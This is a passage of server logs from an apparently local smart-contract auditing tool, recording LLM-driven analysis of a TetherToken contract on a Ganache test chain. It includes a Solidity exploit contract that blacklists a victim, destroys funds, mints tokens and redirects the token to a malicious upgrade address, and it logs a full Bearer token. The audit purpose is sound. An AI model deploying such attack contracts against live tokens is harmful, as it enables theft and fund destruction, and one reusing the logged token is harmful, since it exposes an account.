contract.  \n- This centralization means users must fully trust the owner not to abuse these powers.  \n- Destroying blacklisted funds can lead to permanent loss of user tokens if the owner blacklists an address maliciously or mistakenly.  \n- Owner can mint unlimited tokens via `issue()`, potentially causing inflation and value dilution.  \n\n**B. Blacklist and Destroy Black Funds**  \n- The `destroyBlackFunds` function allows the owner to zero out any blacklisted user‚Äôs balance and reduce total supply accordingly.  \n- There is no mechanism for the blacklisted user to contest or recover funds.  \n- Blacklisting is controlled solely by the owner, no multisig or governance.  \n\n**C. Deprecated Contract Upgrade Mechanism**  \n- The contract can be deprecated by the owner, forwarding all token operations to an upgraded contract address.  \n- The upgrade address is trusted and controlled by the owner.  \n- If the owner sets a malicious upgrade address, users‚Äô tokens and operations can be hijacked or frozen.  \n- No user consent or governance over upgrade.  \n\n**D. Fee Mechanism**  \n- Fees are deducted on transfers and transferFrom, sent to the owner.  \n- Owner can set fee parameters (basisPointsRate and maximumFee) within capped limits.  \n- Although capped, fees can still be set up to 0.2% (20 basis points) and max 50 tokens per transfer, which can be significant for large transfers.  \n- No explicit event emitted when fees are collected (only Transfer events), but this is minor.  \n\n**E. ERC20 Approve Race Condition**  \n- The approve function requires allowance to be zero before setting a new non-zero allowance, mitigating the known ERC20 race condition.  \n- This is a standard pattern and acceptable.  \n\n**F. No Reentrancy or Math Vulnerabilities**  \n- Uses SafeMath for all arithmetic operations, preventing overflows/underflows.  \n- No external calls during state changes except in deprecated mode forwarding calls to upgraded contract.  \n- No payable functions accepting ETH, so no direct ETH theft risk.  \n\n**G. Pausable Mechanism**  \n- Owner can pause/unpause contract, disabling transfers during pause.  \n- No risk here, but again centralized control.  \n\n---\n\n3. Exploitation Requirements:  \n\n- To exploit the contract, an attacker would need to gain control of the owner account or compromise the owner‚Äôs private key.  \n- With owner control, the attacker can:  \n  - Blacklist arbitrary addresses and destroy their token balances, causing permanent loss.  \n  - Mint unlimited tokens via `issue()`, causing inflation and devaluing existing tokens.  \n  - Set high fees within allowed limits to extract value from transfers.  \n  - Deprecate the contract and set a malicious upgrade address to hijack token operations.  \n  - Pause the contract to freeze all transfers.  \n\n- Without owner control, no direct vulnerabilities allow stealing tokens or bypassing restrictions.  \n- Users must trust the owner not to abuse these powerful administrative functions.  \n\n---\n\n**Summary:**  \nThe TetherToken contract is a centralized ERC20 token with owner-controlled blacklisting, minting, pausing, and upgrade mechanisms. The main vulnerabilities stem from the extensive privileges granted to the owner, which can be abused to confiscate tokens, inflate supply, freeze transfers, or hijack the token via upgrade. No technical bugs like reentrancy or math errors are present. The security risk is primarily trust and governance related.\n\n---\n\n**Solidity Version:**  \n`pragma solidity ^0.4.17;`', 'reasoning': 'The analyzed contract is **TetherToken**, an ERC20 token implementation with additional features such as pausability, blacklisting, token upgradeability, and fee parameters. It inherits from several contracts:  \n- Ownable: ownership management  \n- BasicToken and StandardToken: ERC20 token logic with fee deduction on transfers  \n- Pausable: emergency stop mechanism controlled by owner  \n- BlackList: ability to blacklist addresses and destroy their token balances  \n- UpgradedStandardToken interface: for forwarding calls to an upgraded token contract if deprecated  \n\nKey features and logic:  \n- The token supply is initially assigned to the owner.  \n- Transfers and transferFrom apply fees (basisPointsRate and maximumFee), which go to the owner.  \n- The contract can be paused/unpaused by the owner, disabling transfers when paused.  \n- Blacklisted addresses cannot transfer tokens, and their balances can be destroyed by the owner.  \n- The contract supports deprecation: forwarding calls to a new upgraded contract address.  \n- Owner can issue new tokens or redeem tokens from their balance.  \n- Fee parameters are capped (basisPointsRate < 20, maximumFee < 50 tokens).  \n\nSolidity version: **pragma solidity ^0.4.17**\n\n---\n\n2.', 'summary': '**A. Centralization / Owner Privileges**  \n- The owner has extensive control: can pause/unpause the contract, blacklist/unblacklist addresses, destroy blacklisted funds, issue new tokens arbitrarily, redeem tokens, set fee parameters, and deprecate the contract.  \n- This centralization means users must fully trust the owner not to abuse these powers.  \n- Destroying blacklisted funds can lead to permanent loss of user tokens if the owner blacklists an address maliciously or mistakenly.  \n- Owner can mint unlimited tokens via `issue()`, potentially causing inflation and value dilution.  \n\n**B. Blacklist and Destroy Black Funds**  \n- The `destroyBlackFunds` function allows the owner to zero out any blacklisted user‚Äôs balance and reduce total supply accordingly.  \n- There is no mechanism for the blacklisted user to contest or recover funds.  \n- Blacklisting is controlled solely by the owner, no multisig or governance.  \n\n**C. Deprecated Contract Upgrade Mechanism**  \n- The contract can be deprecated by the owner, forwarding all token operations to an upgraded contract address.  \n- The upgrade address is trusted and controlled by the owner.  \n- If the owner sets a malicious upgrade address, users‚Äô tokens and operations can be hijacked or frozen.  \n- No user consent or governance over upgrade.  \n\n**D. Fee Mechanism**  \n- Fees are deducted on transfers and transferFrom, sent to the owner.  \n- Owner can set fee parameters (basisPointsRate and maximumFee) within capped limits.  \n- Although capped, fees can still be set up to 0.2% (20 basis points) and max 50 tokens per transfer, which can be significant for large transfers.  \n- No explicit event emitted when fees are collected (only Transfer events), but this is minor.  \n\n**E. ERC20 Approve Race Condition**  \n- The approve function requires allowance to be zero before setting a new non-zero allowance, mitigating the known ERC20 race condition.  \n- This is a standard pattern and acceptable.  \n\n**F. No Reentrancy or Math Vulnerabilities**  \n- Uses SafeMath for all arithmetic operations, preventing overflows/underflows.  \n- No external calls during state changes except in deprecated mode forwarding calls to upgraded contract.  \n- No payable functions accepting ETH, so no direct ETH theft risk.  \n\n**G. Pausable Mechanism**  \n- Owner can pause/unpause contract, disabling transfers during pause.  \n- No risk here, but again centralized control.  \n\n---\n\n3.', 'code': "pragma solidity 0.4.17;\n\ncontract ExploitTetherToken {\n    address public owner;\n    TetherToken public token;\n\n    function ExploitTetherToken(address _token) public {\n        owner = msg.sender;\n        token = TetherToken(_token);\n    }\n\n    function attack(address victim, address maliciousUpgrade) public {\n        require(msg.sender == owner);\n\n        // Blacklist victim\n        token.addBlackList(victim);\n\n        // Destroy victim's blacklisted funds\n        token.destroyBlackFunds(victim);\n\n        // Mint huge amount of tokens to attacker\n        token.issue(1000000000 ether);\n\n        // Set max fees within allowed limits (20 basis points, 50 tokens max)\n        token.setParams(20, 50 ether);\n\n        // Pause the contract to freeze transfers\n        token.pause();\n\n        // Deprecate contract and set malicious upgrade address\n        token.deprecate(maliciousUpgrade);\n    }\n}\n\ncontract TetherToken {\n    function addBlackList(address _evilUser) public;\n    function destroyBlackFunds(address _blackListedUser) public;\n    function issue(uint amount) public;\n    function setParams(uint newBasisPoints, uint newMaxFee) public;\n    function pause() public;\n    function deprecate(address _upgradedAddress) public;\n}", 'code_type': 'solidity', 'duration': 36.38109827041626}
2025-06-23 14:31:37,105 - app.services.contract_service - INFO - Has exploit code: True
2025-06-23 14:31:37,107 - app.services.contract_service - INFO - No vulnerabilities mentioned: False
2025-06-23 14:31:37,108 - app.services.contract_service - INFO - Final vulnerability determination: True
2025-06-23 14:31:37,111 - app.services.contract_service - INFO - Attack strategy summary: **A. Centralization / Owner Privileges**  
- The owner has extensive control: can pause/unpause the contract, blacklist/unblacklist addresses, destroy blacklisted funds, issue new tokens arbitrarily, redeem tokens, set fee parameters, and deprecate the contract.  
- This centralization means users must fully trust the owner not to abuse these powers.  
- Destroying blacklisted funds can lead to permanent loss of user tokens if the owner blacklists an address maliciously or mistakenly.  
- Owner can mint unlimited tokens via `issue()`, potentially causing inflation and value dilution.  

**B. Blacklist and Destroy Black Funds**  
- The `destroyBlackFunds` function allows the owner to zero out any blacklisted user‚Äôs balance and reduce total supply accordingly.  
- There is no mechanism for the blacklisted user to contest or recover funds.  
- Blacklisting is controlled solely by the owner, no multisig or governance.  

**C. Deprecated Contract Upgrade Mechanism**  
- The contract can be deprecated by the owner, forwarding all token operations to an upgraded contract address.  
- The upgrade address is trusted and controlled by the owner.  
- If the owner sets a malicious upgrade address, users‚Äô tokens and operations can be hijacked or frozen.  
- No user consent or governance over upgrade.  

**D. Fee Mechanism**  
- Fees are deducted on transfers and transferFrom, sent to the owner.  
- Owner can set fee parameters (basisPointsRate and maximumFee) within capped limits.  
- Although capped, fees can still be set up to 0.2% (20 basis points) and max 50 tokens per transfer, which can be significant for large transfers.  
- No explicit event emitted when fees are collected (only Transfer events), but this is minor.  

**E. ERC20 Approve Race Condition**  
- The approve function requires allowance to be zero before setting a new non-zero allowance, mitigating the known ERC20 race condition.  
- This is a standard pattern and acceptable.  

**F. No Reentrancy or Math Vulnerabilities**  
- Uses SafeMath for all arithmetic operations, preventing overflows/underflows.  
- No external calls during state changes except in deprecated mode forwarding calls to upgraded contract.  
- No payable functions accepting ETH, so no direct ETH theft risk.  

**G. Pausable Mechanism**  
- Owner can pause/unpause contract, disabling transfers during pause.  
- No risk here, but again centralized control.  

---

3.
2025-06-23 14:31:37,113 - app.services.contract_service - INFO - Analysis completed with status: KO
2025-06-23 14:31:37,116 - app.services.contract_service - INFO - Temporary file /tmp/tmprvx4kktw.sol removed
2025-06-23 14:31:37,195 - app.api.contract - INFO - Report saved with filename: Ownable_2025-06-23_14-31, status: KO
2025-06-23 14:31:37,198 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-06-23 14:31:37,201 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 14:31:37,203 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 14:31:37,205 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 14:31:37,207 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 14:31:37,210 - werkzeug - INFO - 172.28.0.1 - - [23/Jun/2025 14:31:37] "POST /analyze HTTP/1.1" 200 -
2025-06-23 14:31:37,256 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 14:31:37,259 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 14:31:37,261 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 14:31:37,262 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-23 14:31:37,265 - werkzeug - INFO - 172.28.0.1 - - [23/Jun/2025 14:31:37] "OPTIONS /history HTTP/1.1" 200 -
2025-06-23 14:31:37,499 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 14:31:37,500 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 14:31:37,503 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 14:31:37,505 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 14:31:37,506 - werkzeug - INFO - 172.28.0.1 - - [23/Jun/2025 14:31:37] "GET /history HTTP/1.1" 200 -
2025-06-23 14:41:11,826 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-06-23 14:41:11,992 - app.app - INFO - Application started
2025-06-23 14:41:12,004 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.31.0.5:8000
2025-06-23 14:41:12,005 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-06-23 14:41:49,034 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 14:41:49,043 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 14:41:49,050 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 14:41:49,055 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-23 14:41:49,061 - werkzeug - INFO - 172.31.0.1 - - [23/Jun/2025 14:41:49] "OPTIONS /login HTTP/1.1" 200 -
2025-06-23 14:41:49,073 - app.api.auth - INFO - Received login request with method: POST
2025-06-23 14:41:49,075 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTA2OTI0NjR9.o-l8dSMB_SaWrfSWk0vmw5zouYq048ZMxD70sZVW25U', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-06-23 14:41:49,077 - app.api.auth - INFO - Request content type: application/json
2025-06-23 14:41:49,079 - app.api.auth - INFO - Processing JSON request
2025-06-23 14:41:49,081 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 14:41:49,557 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 14:41:49,561 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 14:41:49,563 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 14:41:49,564 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 14:41:49,565 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-06-23 14:41:49,570 - werkzeug - INFO - 172.31.0.1 - - [23/Jun/2025 14:41:49] "POST /login HTTP/1.1" 200 -
2025-06-23 14:42:08,675 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-06-23 14:42:08,684 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-06-23 14:42:08,687 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-06-23 14:42:08,694 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-06-23 14:42:08,700 - werkzeug - INFO - 172.31.0.1 - - [23/Jun/2025 14:42:08] "OPTIONS /analyze HTTP/1.1" 200 -
2025-06-23 14:42:08,719 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 14:42:08,731 - app.api.contract - INFO - Analyzing code snippet
2025-06-23 14:42:08,742 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-23 14:42:08,749 - app.services.contract_service - INFO - Created temporary file for contract code: /tmp/tmppqva0qgb.sol
2025-06-23 14:42:08,761 - app.services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-06-23 14:42:08,762 - app.services.contract_service - INFO - Compiling contract...
2025-06-23 14:42:08,919 - solcx - INFO - Downloading from https://solc-bin.ethereum.org/linux-amd64/solc-linux-amd64-v0.4.17+commit.bdeb9e52
2025-06-23 14:42:09,540 - solcx - INFO - Using solc version 0.4.17
2025-06-23 14:42:09,542 - solcx - INFO - solc 0.4.17 successfully installed at: /root/.solcx/solc-v0.4.17
2025-06-23 14:42:09,547 - solcx - INFO - Using solc version 0.4.17
2025-06-23 14:42:14,231 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 14:42:15,397 - app.services.contract_service - INFO - Compilation result: 4 contracts compiled
2025-06-23 14:42:15,398 - app.services.contract_service - INFO - Deploying 4 contracts...
2025-06-23 14:42:15,838 - app.services.contract_service - INFO - Contract Ownable deployed at 0xC89Ce4735882C9F0f0FE26686c53074E09B0D550
2025-06-23 14:42:15,840 - app.services.contract_service - INFO - Setting up contract Ownable...
2025-06-23 14:42:15,965 - app.services.contract_service - INFO - Contract Ownable setup completed
2025-06-23 14:42:15,967 - app.services.contract_service - INFO - Funding contract Ownable for attack testing...
2025-06-23 14:42:16,108 - app.services.contract_service - INFO - Contract Ownable funded
2025-06-23 14:42:16,529 - app.services.contract_service - INFO - Contract Pausable deployed at 0xD833215cBcc3f914bD1C9ece3EE7BF8B14f841bb
2025-06-23 14:42:16,530 - app.services.contract_service - INFO - Setting up contract Pausable...
2025-06-23 14:42:16,715 - app.services.contract_service - INFO - Contract Pausable setup completed
2025-06-23 14:42:16,717 - app.services.contract_service - INFO - Funding contract Pausable for attack testing...
2025-06-23 14:42:16,879 - app.services.contract_service - INFO - Contract Pausable funded
2025-06-23 14:42:17,209 - app.services.contract_service - INFO - Contract SafeMath deployed at 0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7
2025-06-23 14:42:17,210 - app.services.contract_service - INFO - Setting up contract SafeMath...
2025-06-23 14:42:17,238 - app.services.contract_service - INFO - Contract SafeMath setup completed
2025-06-23 14:42:17,239 - app.services.contract_service - INFO - Funding contract SafeMath for attack testing...
2025-06-23 14:42:17,384 - app.services.contract_service - INFO - Contract SafeMath funded
2025-06-23 14:42:18,418 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 14:42:18,472 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-06-23 14:42:18,483 - app.api.contract - INFO - Analyzing code snippet
2025-06-23 14:42:18,492 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-06-23 14:42:18,496 - app.services.contract_service - INFO - Created temporary file for contract code: /tmp/tmp0jyceoup.sol
2025-06-23 14:42:18,503 - app.services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-06-23 14:42:18,505 - app.services.contract_service - INFO - Compiling contract...
2025-06-23 14:42:18,530 - solcx - INFO - Using solc version 0.4.17
2025-06-23 14:42:19,251 - app.services.contract_service - INFO - Contract TetherToken deployed at 0xe982E462b094850F12AF94d21D470e21bE9D0E9C
2025-06-23 14:42:19,252 - app.services.contract_service - INFO - Setting up contract TetherToken...
2025-06-23 14:42:23,226 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 14:42:23,996 - app.services.contract_service - INFO - Compilation result: 4 contracts compiled
2025-06-23 14:42:23,999 - app.services.contract_service - INFO - Deploying 4 contracts...
2025-06-23 14:42:24,339 - app.services.contract_service - INFO - Contract Ownable deployed at 0x2612Af3A521c2df9EAF28422Ca335b04AdF3ac66
2025-06-23 14:42:24,341 - app.services.contract_service - INFO - Setting up contract Ownable...
2025-06-23 14:42:24,447 - app.services.contract_service - INFO - Contract Ownable setup completed
2025-06-23 14:42:24,449 - app.services.contract_service - INFO - Funding contract Ownable for attack testing...
2025-06-23 14:42:24,593 - app.services.contract_service - INFO - Contract Ownable funded
2025-06-23 14:42:24,893 - app.services.contract_service - INFO - Contract Pausable deployed at 0xA57B8a5584442B467b4689F1144D269d096A3daF
2025-06-23 14:42:24,894 - app.services.contract_service - INFO - Setting up contract Pausable...
2025-06-23 14:42:24,908 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 14:42:25,336 - app.services.contract_service - INFO - Contract Pausable setup completed
2025-06-23 14:42:25,340 - app.services.contract_service - INFO - Funding contract Pausable for attack testing...
2025-06-23 14:42:25,652 - app.services.contract_service - INFO - Contract Pausable funded
2025-06-23 14:42:25,919 - app.services.contract_service - INFO - Contract SafeMath deployed at 0x630589690929E9cdEFDeF0734717a9eF3Ec7Fcfe
2025-06-23 14:42:25,921 - app.services.contract_service - INFO - Setting up contract SafeMath...
2025-06-23 14:42:25,949 - app.services.contract_service - INFO - Contract SafeMath setup completed
2025-06-23 14:42:25,950 - app.services.contract_service - INFO - Funding contract SafeMath for attack testing...
2025-06-23 14:42:26,084 - app.services.contract_service - INFO - Contract SafeMath funded
2025-06-23 14:42:26,305 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 14:42:26,647 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 14:42:27,121 - httpx - INFO - HTTP Request: POST https://api.openai.com/v1/chat/completions "HTTP/1.1 200 OK"
2025-06-23 14:42:27,336 - app.services.contract_service - INFO - Contract TetherToken deployed at 0xDb56f2e9369E0D7bD191099125a3f6C370F8ed15
2025-06-23 14:42:27,338 - app.services.contract_service - INFO - Setting up contract TetherToken...
2025-06-23 14:42:27,404 - app.services.contract_service - INFO - Contract TetherToken setup completed
2025-06-23 14:42:27,406 - app.services.contract_service - INFO - Funding contract TetherToken for attack testing...
2025-06-23 14:42:27,823 - app.services.contract_service - INFO - Contract TetherToken funded
2025-06-23 14:42:27,825 - app.services.contract_service - INFO - Building contract observation...
2025-06-23 14:42:31,612 - app.services.contract_service - INFO - Contract observation built successfully
2025-06-23 14:42:31,614 - app.services.contract_service - INFO - Generating attack strategy...
2025-06-23 14:42:31,615 - app.services.contract_service - INFO - Running Slither analysis...
2025-06-23 14:42:31,630 - app.services.contract_service - WARNING - Failed to run Slither analysis: solc-select non trouv√© : installe-le via pip install solc-select
2025-06-23 14:42:31,659 - app.services.contract_service - WARNING - Traceback (most recent call last):
  File "/app/modules/slither_scan.py", line 38, in ensure_solc_version
    subprocess.run(
  File "/usr/local/lib/python3.12/subprocess.py", line 548, in run
    with Popen(*popenargs, **kwargs) as process:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/subprocess.py", line 1026, in __init__
    self._execute_child(args, executable, preexec_fn, close_fds,
  File "/usr/local/lib/python3.12/subprocess.py", line 1955, in _execute_child
    raise child_exception_type(errno_num, err_msg, err_filename)
FileNotFoundError: [Errno 2] No such file or directory: 'solc-select'

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/app/services/contract_service.py", line 192, in analyze_contract_from_code
    slith_result = slither_analyze(temp_path)
                   ^^^^^^^^^^^^^^^^^^^^^^^^^^
